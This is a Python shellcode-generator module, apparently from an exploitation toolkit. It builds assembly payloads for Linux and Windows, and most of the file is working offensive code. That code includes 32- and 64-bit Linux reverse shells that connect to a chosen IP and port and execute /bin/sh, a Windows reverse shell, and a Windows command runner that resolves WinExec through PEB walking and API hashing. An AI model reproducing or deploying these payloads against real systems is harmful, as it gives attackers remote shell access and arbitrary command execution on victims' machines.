#!/usr/bin/python
# -*- coding: utf-8 -*-

from ctypes import *
from ShellUtils import *


class ShellGenerator:
    def __init__(self, OS_TARGET, OS_TARGET_ARCH):
        self.os_target = OS_TARGET
        self.target = None
        if OS_TARGET == Constants.OS.WINDOWS:
            self.target = WindowsShellcodes(OS_TARGET_ARCH)
        elif OS_TARGET == Constants.OS.LINUX:
            self.target = LinuxShellcodes(OS_TARGET_ARCH)
        else:
            print("OS '%s' is not supported" % OS_TARGET)
            return
        self.OS_TARGET_ARCH = OS_TARGET_ARCH
    
    def get_shellcode(self, type, message="", connectback_ip="127.0.0.1", connectback_port=5555, command="", make_exe=0, debug=0, filename="", dll_inj_funcs=[]):
        if not self.target:
            print("Generating shellcodes for '%s' OS is not supported" % self.os_target)
            return None
        if type not in self.target.shell_types:
            print("There no shellcodes of type '%s' for system %s" % (type, self.target_os))
            return None
        code = ""
        need_to_build = False


        if type == "message":
            code = self.target.message(message)
        elif type == "reverse":
            if not connectback_ip or not connectback_port:
                print "You must specify connectback params"
                return None
            code = self.target.reverse(connectback_ip, connectback_port)
        elif type == "command":
            code = self.target.command(command)
        else:
            return None


        shell, filepath = create_shellcode(code, self.os_target, self.OS_TARGET_ARCH, make_exe, debug, filename, dll_inj_funcs)
        return shell, filepath


class LinuxShellcodes():
    """
        Class with shellcodes (asm language)
    """
    def __init__(self, OS_TARGET_ARCH):
        self.shell_types = ["message", "reverse"]
        self.target_os = "LINUX"
        self.OS_TARGET_ARCH = OS_TARGET_ARCH

    def message(self, message=''):
        """
            Get simple asm code for Linux
        """

        if not message:
            message = 'hello'

        code = """
BITS OS_TARGET_ARCH

jmp short one

two:
    pop ecx         ;get the address of the string from the stack

    xor eax, eax    ;clean up the registers
    mov al, 4       ;syscall write

    xor ebx, ebx
    inc ebx         ;stdout is 1
    xor edx,edx
    mov dl, LENGTH      ;length of the string
    int 0x80

    mov al, 1       ;exit the shellcode
    dec ebx
    int 0x80

one:
    call two        ;jump to avoid null-bytes
    db 'MESSAGE', 0x0a, 0x0d
"""

        if self.OS_TARGET_ARCH == '32bit':
            code = code.replace("OS_TARGET_ARCH", "32")
        elif self.OS_TARGET_ARCH == '64bit':
            code = code.replace("OS_TARGET_ARCH", "64")
            code = code.replace("ecx", "rcx")
        else:
            print "Format: %s is not supported" % self.OS_TARGET_ARCH
            return

        code = code.replace("MESSAGE", message)
        code = code.replace("LENGTH", str(len(message)))
        return code

    def reverse(self, connectback_ip, connectback_port):
        """
            Get reverse shellcode for Linux
        """

        # Reverse engineering
        # $ strace -e execve,socket,bind,connect nc 127.0.0.1 12357
        # execve("/usr/bin/nc", ["nc", "127.0.0.1", "12357"], [/* 59 vars */]) = 0
        # socket(PF_NETLINK, SOCK_RAW, 0)         = 3
        # bind(3, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 0
        #
        # Here is a part we were looking for:
        #
        # socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
        # connect(
        #   3,
        #   {sa_family=AF_INET, sin_port=htons(12357), sin_addr=inet_addr("127.0.0.1")},
        #   16
        # ) = -1 EINPROGRESS (Operation now in progress)

        if not connectback_ip or not connectback_port:
            print "You must specify some params"
            return None

        code = ""
        if self.OS_TARGET_ARCH == '32bit':
            code = """
BITS 32

global _start

_start:
    ;    =============================== SOCKET =====================================
    ;    socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
    ;
    ;    int socket(int domain, int type, int protocol);
    ;
    ;    int socketcall(int call, unsigned long *args)
    ;    socketcall    SYS_SOCKET      socket() args
    ;    EAX           EBX             ECX
    ;    102           1               (2, 1, 6)
    ;
    ;    SYS_SOCKET will return file descriptor (fd) in EAX.

    ; EAX
    xor eax, eax
    mov al, 102             ; socketcall

    ; EBX
    xor ebx, ebx
    mov bl, 1               ; SYS_SOCKET socket()

    ; ECX
    xor ecx, ecx
    push ecx
    push BYTE 6             ; IPPROTO_TCP   ||      int protocol);
    push BYTE 1             ; SOCK_STREAM   ||      int type,
    push BYTE 2             ; AF_INET       || socket(int domain,
    mov ecx, esp            ; ECX - PTR to arguments for socket()
    int 0x80                ; sockfd will be stored in EAX after this call

    ; EAX return
    mov esi, eax            ; save socket fd in ESI for later

    ;
    ; =============================== CONNECT =====================================
    ;
    ; connect(
    ;   3,
    ;   {sa_family=AF_INET, sin_port=htons(12357), sin_addr=inet_addr("127.0.0.1")},
    ;   16
    ; ) = -1 EINPROGRESS (Operation now in progress)
    ;
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;

    jmp short call_get_ip_and_port

back2shellcode:
    pop edi                 ; getting ip and port address from ESP

    ; EAX
    xor eax, eax
    mov al, 102             ; socketcall

    ; EBX
    xor ebx, ebx
    mov bl, 3               ; SYS_CONNECT connect()

    ; ECX
    xor edx, edx
    ;    push edx                ; 0.0.0.0 - ALL interfaces
    ;    push DWORD 0x0100007f   ; 127.0.0.1 in reverse  *** CONTAINS NULLs ! ***
    ;    push DWORD 0x0101a8c0   ; 192.168.1.1 in reverse
    push DWORD [edi]    ; push IP
    push WORD [edi+0x4] ; push port
    dec ebx                     ; decrease bl from 3 to 2 to use it in the next push
    push WORD bx                ; 2 - AF_INET
    inc ebx                     ; put back bl to 3 for SYS_CONNECT
    mov ecx, esp                ; ptr to struct sockaddr

    push BYTE 16                ;   socklen_t addrlen);
    push ecx                    ;   const struct sockaddr *addr,
    push esi                    ; connect(int sockfd,
    mov ecx, esp                ; ECX = PTR to arguments for connect()
    int 0x80                    ; sockfd will be in EBX

    ;
    ; =============================== DUP FD =====================================
    ;
    ; Before we spawn a shell, we need to forward all I/O (stdin,stdout,stderr)
    ; to a client. For this, we can dup2 syscall to duplicate a file descriptor.
    ; man 2 dup2
    ; int dup2(int oldfd,           int newfd);
    ; EAX,          EBX,            ECX
    ; 63            sockfd          0
    ; 63            sockfd          1
    ; 63            sockfd          2
    ;

    ; move our sockfd to EAX
    mov eax, ebx

    xor eax, eax
    mov al, 63              ; dup2 syscall
    xor ecx, ecx            ; 0 - stdin
    int 0x80                ; call dup2(sockfd, 0)

    mov al, 63              ; dup2 syscall
    mov cl, 1               ; 1 - stdout
    int 0x80                ; call dup2(sockfd, 1)

    mov al, 63              ; dup2 syscall
    mov cl, 2               ; 2 - stderr
    int 0x80                ; call dup2(sockfd, 2)

    ;
    ; =============================== EXECVE =====================================
    ;
    ; Now as we forwarded sockfd to a client, we can spawn shell.
    ; Prepare the path, in little-endian, using the Python
    ; >>> '//bin/sh'[::-1].encode('hex')
    ; '68732f6e69622f2f'
    ;
    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    ; EAX           EBX,                    ECX,            EDX
    ; 11            '//bin/sh'              PTR to EBX      NULL

    ; EAX
    xor eax, eax
    mov al, 11              ; execve syscall

    ; EBX
    xor edx, edx
    push edx                ; NULL termination of '//bin/sh' string
    push 0x68732f6e         ; '//bin/sh' in reverse
    push 0x69622f2f         ; beginning of '//bin/sh' string is here
    mov ebx, esp            ; put the address of '//bin/sh' into ebx via esp

    ; ECX
    push edx                ; NULL termination of a stack
    push ebx                ; load our '//bin/sh' on a stack
    mov ecx, esp            ; ECX is a PTR to stack where we've got EBX address to '//bin/sh' string.

    ; EDX
    push edx                ; NULL terminator
    mov edx, esp            ; EDX is a PTR to a stack which has an address to NULL.
    int 0x80                ; call execve(EBX, ECX, EDX)

call_get_ip_and_port:
    call back2shellcode

    ;    dd 0x0101a8c0                  ; Example: DWORD 192.168.1.1 reverse (in hex)
    ;    db 0xc0, 0xa8, 0x01, 0x01      ; Example: BYTE 192.168.1.1 straight (in hex)
    db CONNECTBACK_IP

    ;    dw 0x4530                      ; Example: WORD 12357 reverse (in hex)
    ;    db 0x30, 0x45                  ; Example: BYTE 12357 straight (in hex)
    db CONNECTBACK_PORT
"""

            connectback_ip_hex = ''
            for i in connectback_ip.split('.'):
                connectback_ip_hex += '0x' + '{:02X}'.format(int(i)) + ', '
            connectback_ip_hex = connectback_ip_hex[:-2]

            connectback_port_hex = '0x' + '{:04X}'.format(connectback_port)[:-2] + ', '
            connectback_port_hex += '0x' + '{:04X}'.format(connectback_port)[-2:]

        elif self.OS_TARGET_ARCH == '64bit':
            code = """
BITS 64
global _start

; settings
;IP          equ 0x0100007f  ; default 127.0.0.1, contains nulls so will need mask
IP      equ CONNECTBACK_IP
;PORT        equ 0x5c11      ; default 4444
PORT        equ CONNECTBACK_PORT

; syscall kernel opcodes
SYS_SOCKET  equ 0x29
SYS_CONNECT equ 0x2a
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b

; argument constants
AF_INET     equ 0x2
SOCK_STREAM equ 0x1

_start:
; High level psuedo-C overview of shellcode logic:
;
; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
;
; struct sockaddr = {AF_INET; [PORT; IP; 0x0]}
;
; connect(sockfd, &sockaddr, 16)
;
; dup2(sockfd, STDIN+STDOUT+STDERR)
; execve("/bin/sh", NULL, NULL)

create_sock:
    ; sockfd = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; syscall number 41 

    xor esi, esi        ; 0 out rsi
    mul esi             ; 0 out rax, rdx

                        ; rdx = IPPROTO_IP (int: 0)

    inc esi             ; rsi = SOCK_STREAM (int: 1)

    push AF_INET        ; rdi = AF_INET (int: 2)
    pop rdi

    add al, SYS_SOCKET
    syscall

    ; copy socket descriptor to rdi for future use 

    push rax
    pop rdi

struct_sockaddr:
    ; server.sin_family = AF_INET
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
    ; bzero(&server.sin_zero, 8)

    push rdx
    push rdx

    mov dword [rsp + 0x4], IP
    mov word [rsp + 0x2], PORT
    mov byte [rsp], AF_INET

connect_sock:
    ; connect(sockfd, (struct sockaddr *)&server, sockaddr_len)

    push rsp
    pop rsi

    push 0x10
    pop rdx

    push SYS_CONNECT
    pop rax
    syscall

dupe_sockets:
    ; dup2(sockfd, STDIN)
    ; dup2(sockfd, STDOUT)
    ; dup2(sockfd, STERR)

    push 0x3                ; loop down file descriptors for I/O
    pop rsi

dupe_loop:
    dec esi
    mov al, SYS_DUP2
    syscall

    jne dupe_loop

exec_shell:
    ; execve('//bin/sh', NULL, NULL)

    push rsi                    ; *argv[] = 0
    pop rdx                     ; *envp[] = 0

    push rsi                    ; '\0'
    mov rdi, '//bin/sh'         ; str
    push rdi
    push rsp
    pop rdi                     ; rdi = &str (char*)

    mov al, SYS_EXECVE          ; we fork with this syscall
    syscall
"""
            connectback_ip_hex = '0x'
            for i in reversed(connectback_ip.split('.')):
                connectback_ip_hex += '{:02X}'.format(int(i))

            connectback_port_hex = '0x' + '{:04X}'.format(connectback_port)[-2:]
            connectback_port_hex += '{:04X}'.format(connectback_port)[:-2]

        else:
            print "Format: %s is not supported" % self.OS_TARGET_ARCH
            return

        code = code.replace("CONNECTBACK_IP", connectback_ip_hex)
        code = code.replace("CONNECTBACK_PORT", connectback_port_hex)
        return code

class WindowsShellcodes():
    def __init__(self, OS_TARGET_ARCH):
        self.shell_types = ["message", "reverse", "command"]
        self.target_os = "WINDOWS"
        self.target_arch = OS_TARGET_ARCH

    def message(self, message=''):
        """
            Get simple asm code for windows
        """

        if not message:
            message = 'hello'

        code = """
global _start
_start:
    ;eax holds return value
    ;ebx will hold function addresses
    ;ecx will hold string pointers
    ;edx will hold NULL

    xor eax,eax
    xor ebx,ebx                     ;zero out the registers
    xor ecx,ecx
    xor edx,edx

    jmp short GetLibrary
LibraryReturn:
    pop ecx                         ;get the library string
    mov [ecx + 10], dl              ;insert NULL
    mov ebx, ADDR_LoadLibraryA      ;LoadLibraryA(libraryname);
    push ecx                        ;beginning of user32.dll
    call ebx                        ;eax will hold the module handle

    jmp short FunctionName
FunctionReturn:

    pop ecx                         ;get the address of the Function string
    xor edx,edx
    mov [ecx + 11], dl              ;insert NULL
    push ecx
    push eax
    mov ebx, ADDR_GetProcAddress    ;GetProcAddress(hmodule,functionname);
    call ebx                        ;eax now holds the address of MessageBoxA

    jmp short Message
MessageReturn:
    pop ecx                         ;get the message string
    xor edx,edx
    mov [ecx+3], dl                 ;insert the NULL

    xor edx,edx

    push edx                        ;MB_OK
    push ecx                        ;title
    push ecx                        ;message
    push edx                        ;NULL window handle

    call eax                        ;MessageBoxA(windowhandle,msg,title,type); Address

ender:
    xor edx,edx
    push eax
    mov eax, ADDR_ExitProcess       ;ExitProcess(exitcode);
    call eax                        ;exit cleanly so we don't crash the parent program

    ;the N at the end of each string signifies the location of the NULL
    ;character that needs to be inserted

GetLibrary:
    call LibraryReturn
    db 'user32.dllN'
FunctionName:
    call FunctionReturn
    db 'MessageBoxAN'
Message:
    call MessageReturn
    db 'MESSAGEN'
"""

        code = code.replace("MESSAGE", str(message))

        functions = ['LoadLibraryA', 'GetProcAddress', 'ExitProcess']
        handle = windll.kernel32.GetModuleHandleA('kernel32.dll')
        for func in functions:
            address = hex(windll.kernel32.GetProcAddress(handle, func))
            code = code.replace("ADDR_" + func, str(address))

        return code

    def command(self, command='calc.exe', technique='PEB'):
        """
            Get simple asm code for windows
        """

        code = ''

        if technique == 'SEH':
            code = """
global _start
_start:
    call start_main

LGetProcAddress:
    push ebx
    push ebp
    push esi
    push edi
    mov ebp, [esp + 24]
    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 120]
    add edx, ebp
    mov ecx, [edx + 24]
    mov ebx, [edx + 32]
    add ebx, ebp

LFnlp:
    jecxz LNtfnd
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp
    xor edi, edi
    cld

LHshlp:
    xor eax, eax
    lodsb
    cmp al, ah
    je LFnd
    ror edi, 13
    add edi, eax
    jmp short LHshlp

LFnd:
    cmp edi, [esp + 20]
    jnz LFnlp
    mov ebx, [edx + 36]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 28]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    jmp short LDone

LNtfnd:
    xor eax, eax

LDone:
    pop edi
    pop esi
    pop ebp
    pop ebx
    ret 8

start_main:
    pop esi
    push byte 0x30
    pop ecx
    mov ebx, [fs:ecx]
    mov ebx, [ebx + 0x0c]
    mov ebx, [ebx + 0x1c]
    mov ebx, [ebx]
    mov ebx, [ebx + 0x08]

    push ebx                ; kernel32.dll base
    push HASH_WinExec       ; WinExec
    call esi                ; GetProcAddress(kerne32.dll, WinExec)
    push eax

    push ebx                ; kernel32.dll base
    push HASH_ExitProcess   ; ExitProcess
    call esi                ; GetProcAddress(kerne32.dll, ExitProcess)
    push eax
"""

            code += """
jmp short GetCommand

CommandReturn:
    pop ebx            	    ; ebx now holds the handle to the string
    ;xor eax,eax
    push eax
    xor eax,eax             ; for some reason the registers can be very volatile, did this just in case
    ;mov [ebx + 89],al   	; insert the NULL character
    push ebx
    mov ebx, [ebp-32]       ; WinExec: 0x7c86114d
    call ebx           	    ; call WinExec(path,showcode)

    xor eax,eax        	    ; zero the register again, clears WinExec retval
    push eax
    mov ebx, [ebp-36]       ; ExitProcess: 0x7c81caa2
    call ebx           	    ;call ExitProcess(0);

GetCommand:
    ;the N at the end of the db will be replaced with a null character
    call CommandReturn
    db "COMMAND 0"
"""
            code = code.replace("COMMAND", str(command))
            code = code.replace('HASH_WinExec', str(self.compute_hash_by('WinExec', 0xd)))
            code = code.replace('HASH_ExitProcess', str(self.compute_hash_by('ExitProcess', 0xd)))

        if technique == 'PEB':
            code = """
global _start
_start:
    jmp start_main

;peb technique
find_kernel32:
    xor eax, eax                ; clear ebx
    mov eax, [fs:0x30]          ; get a pointer to the PEB
    mov eax, [eax+0x0C]         ; get PEB->Ldr
    mov eax, [eax+0x14]         ; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov eax, [eax]              ; get the next entry (2nd entry)
    mov eax, [eax]              ; get the next entry (3rd entry)
    mov eax, [eax+0x10]         ; get the 3rd entries base address (kernel32.dll)
    ret
;Function : Find function base address
find_function:
    pushad
    mov ebp,[esp+0x24]
    mov eax,[ebp+0x3c]
    mov edx,[ebp+eax+0x78]
    add edx,ebp
    mov ecx,[edx+0x18]
    mov ebx,[edx+0x20]
    add ebx,ebp
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi,[ebx+ecx*4]
    add esi,ebp
    xor edi,edi
    xor eax,eax
    cld
compute_hash_again:
    lodsb
    test al,al
    jz compute_hash_finished
    ror edi,0xd
    add edi,eax
    jmp compute_hash_again
compute_hash_finished:
find_function_compare:
    cmp edi,[esp+0x28]
    jnz find_function_loop
    mov ebx,[edx+0x24]
    add ebx,ebp
    mov cx,[ebx+2*ecx]
    mov ebx,[edx+0x1c]
    add ebx,ebp
    mov eax,[ebx+4*ecx]
    add eax,ebp
    mov [esp+0x1c],eax
find_function_finished:
    popad
    ret
find_funcs_for_dll:
    lodsd
    push eax
    push edx
    call find_function
    mov [edi], eax
    add esp,0x08
    add edi,0x04
    cmp esi,ecx
    jne find_funcs_for_dll
find_funcs_for_dll_finished:
    ret

GetHashes:
    call GetHashesReturn
    dd HASH_CreateFileA     ; CreateFileA hash
    dd HASH_WriteFile       ; WriteFile hash
    dd HASH_CloseHandle     ; CloseHandle hash
    dd HASH_WinExec         ; WinExec hash
    dd HASH_ExitProcess     ; ExitProcess hash

;Main
start_main:
    sub esp,0x14            ;allocate space on stack to store 5 function address
    mov ebp,esp
    call find_kernel32
    mov edx,eax             ;save base address of kernel32 in edx
    jmp GetHashes           ;get address of WinExec hash
GetHashesReturn:
    pop esi                 ;get pointer to hash into esi
    lea edi, [ebp+0x4]      ;we will store the function addresses at edi
    mov ecx,esi
    add ecx,0x14            ; store address of last hash into ecx
    call find_funcs_for_dll ;get function pointers for all hashes
    jmp startcalling
startcalling:
    ;All Done Start calling Win32 APIs
    xor eax,eax
    xor ebx,ebx             ;zero out the registers
    xor ecx,ecx             ;ECX will always hold 0
    jmp GetArgument

GetArgument:
    call ArgumentReturn
    db "COMMAND 0"

ArgumentReturn:             ;calc.exe
    pop edx
    push edx
    call [ebp+16]           ;WinExec.Kernel32.dll
    push ecx                ;0
    call [ebp+20]           ;ExitProcess.Kernel32.dll
"""
            code = code.replace("COMMAND", str(command))
            code = code.replace('HASH_CreateFileA', str(self.compute_hash_by('CreateFileA', 0xd)))
            code = code.replace('HASH_WriteFile', str(self.compute_hash_by('WriteFile', 0xd)))
            code = code.replace('HASH_CloseHandle', str(self.compute_hash_by('CloseHandle', 0xd)))
            code = code.replace('HASH_WinExec', str(self.compute_hash_by('WinExec', 0xd)))
            code = code.replace('HASH_ExitProcess', str(self.compute_hash_by('ExitProcess', 0xd)))
        return code

    def reverse(self, connectback_ip, connectback_port):
        code = """
global _start
_start:
	cld
	call main
	pusha
	mov ebp,esp
	xor eax,eax
	mov edx,DWORD  [fs:eax+0x30]
	mov edx,DWORD  [edx+0xc]
	mov edx,DWORD  [edx+0x14]
place1:
	mov esi,DWORD  [edx+0x28]
	movzx ecx,WORD  [edx+0x26]
	xor edi,edi
loop1:
	lodsb
	cmp al,0x61
	jl place2
	sub al,0x20
place2:
	ror edi,0xd
	add edi,eax
	loop loop1
	push edx
	push edi
	mov edx,DWORD  [edx+0x10]
	mov ecx,DWORD  [edx+0x3c]
	mov ecx,DWORD  [ecx+edx*1+0x78]
	jecxz place6
	add ecx,edx
	push ecx
	mov ebx,DWORD  [ecx+0x20]
	add ebx,edx
	mov ecx,DWORD  [ecx+0x18]
place3:
	jecxz place5
	dec ecx
	mov esi,DWORD  [ebx+ecx*4]
	add esi,edx
	xor edi,edi
place4:
	lodsb
	ror edi,0xd
	add edi,eax
	cmp al,ah
	jne place4
	add edi,DWORD  [ebp-0x8]
	cmp edi,DWORD  [ebp+0x24]
	jne place3
	pop eax
	mov ebx,DWORD  [eax+0x24]
	add ebx,edx
	mov cx,WORD  [ebx+ecx*2]
	mov ebx,DWORD  [eax+0x1c]
	add ebx,edx
	mov eax,DWORD  [ebx+ecx*4]
	add eax,edx
	mov DWORD  [esp+0x24],eax
	pop ebx
	pop ebx
	popa
	pop ecx
	pop edx
	push ecx
	jmp eax
place5:
	pop edi
place6:
	pop edi
	pop edx
	mov edx,DWORD  [edx]
	jmp place1
main:
	pop ebp
	push 0x3233
	push 0x5f327377
	push esp
	push 0x726774c
	call ebp
	mov eax,0x190
	sub esp,eax
	push esp
	push eax
	push 0x6b8029
	call ebp
	push eax
	push eax
	push eax
	push eax
	inc eax
	push eax
	inc eax
	push eax
	push 0xe0df0fea
	call ebp
	xchg edi,eax
	push 0x5
	push CONNECTBACK_IP    ;host
	push CONNECTBACK_PORT   ; port
	mov esi,esp
place7:
	push 0x10
	push esi
	push edi
	push 0x6174a599
	call ebp
	test eax,eax
	je place8
	dec DWORD  [esi+0x8]
	jne place7
	push 0x56a2b5f0
	call ebp
place8:
	push 0x646d63
	mov ebx,esp
	push edi
	push edi
	push edi
	xor esi,esi
	push 0x12
	pop ecx
loop2:
	push esi
	loop loop2
	mov WORD  [esp+0x3c],0x101
	lea eax,[esp+0x10]
	mov BYTE  [eax],0x44
	push esp
	push eax
	push esi
	push esi
	push esi
	inc esi
	push esi
	dec esi
	push esi
	push esi
	push ebx
	push esi
	push 0x863fcc79
	call ebp
	mov eax,esp
	dec esi
	push esi
	inc esi
	push DWORD  [eax]
	push 0x601d8708
	call ebp
	mov ebx,0x56a2b5f0
	push 0x9dbd95a6
	call ebp
	cmp al,0x6
	jl place9
	cmp bl,0xe0
	jne place9
	mov ebx,0x6f721347
place9:
	push 0x0
	push ebx
	call ebp

"""
        connectback_ip_hex = '0x'
        connectback_ip_arr = []
        for i in connectback_ip.split('.'):
            connectback_ip_arr.append('{:02X}'.format(int(i)))
        for i in reversed(connectback_ip_arr):
            connectback_ip_hex += i

        connectback_port_hex = '0x' + '{:04X}'.format(connectback_port)[-2:]
        connectback_port_hex += '{:04X}'.format(connectback_port)[:-2]
        connectback_port_hex += '0002'

        code = code.replace("CONNECTBACK_IP", connectback_ip_hex)
        code = code.replace("CONNECTBACK_PORT", connectback_port_hex)
        return code

    def compute_hash_by(self, key, num=0xd):
        """
            Compute hash of WinApi functions
        """
        hash = 0
        while key:
            c_ptr = ord(key[0])
            hash = (hash << (32 - num)) & 0xffffffff | (hash >> num) & 0xffffffff
            hash += c_ptr
            key = key[1:]
        hash = "0x%08x" % hash
        return hash
